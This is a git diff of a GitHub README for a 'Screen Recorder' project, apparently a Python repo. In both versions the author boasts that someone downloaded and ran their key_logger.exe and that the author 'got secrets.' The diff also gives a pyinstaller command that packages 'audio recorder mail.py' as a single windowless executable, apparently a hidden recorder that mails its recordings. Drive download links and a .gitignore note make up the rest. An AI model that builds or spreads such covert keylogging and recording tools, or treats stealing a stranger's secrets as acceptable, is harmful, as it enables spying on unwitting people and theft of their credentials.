@@ -1,6 +1,7 @@
-# [Screen-Recorder](https://drive.google.com/file/d/1n4j5X-lLleNIoIVqgOuGjTMYj4RsLdyi/view?usp=sharing)
+# Screen Recorder
 
-`Someone from Maharashtra` `mistakenly / intentionally downloaded and run` `my key_logger.exe`, `and I got secrets`.
+        Someone from Maharashtra mistakenly / intentionally 
+        downloaded and run my key_logger.exe, and I got secrets.
 
 [![image](https://user-images.githubusercontent.com/50515418/222940584-2fdc27dd-0678-49f1-a1c3-44103757f54a.png)](https://www.ionos.com/digitalguide/server/security/keylogger/)
 
@@ -15,7 +16,9 @@
     cd dist
     "screen recorder.exe"
 
-#### pyinstaller --onefile --noconsole "audio recorder mail.py"
+<br>
+
+    pyinstaller --onefile --noconsole "audio recorder mail.py"
 
 # File Upload
 - [Tutorial Repo](https://github.com/imvickykumar999/python-samples/tree/master/drive/driveapp)
@@ -23,9 +26,9 @@
 
 [![image](https://user-images.githubusercontent.com/50515418/130186810-92480000-b0e2-4b34-b0c9-3e23ea57fa36.png)](https://drive.google.com/drive/folders/10TsjjdVGEZsREO33nPSFhf5ELHUU6EjZ?usp=sharing)
 
-# [Why do I need to ignore files in Git](https://www.bmc.com/blogs/gitignore) ?
+# Why do I need to ignore files in [.gitignore?](https://github.com/imvickykumar999/Screen-Recorder/blob/main/.gitignore)
 
-- The files contain [sensitive data](https://github.com/imvickykumar999/Screen-Recorder/blob/main/.gitignore).
+- The files contain sensitive data.
 - Security and API keys/secrets
 
         For security, the security key files and
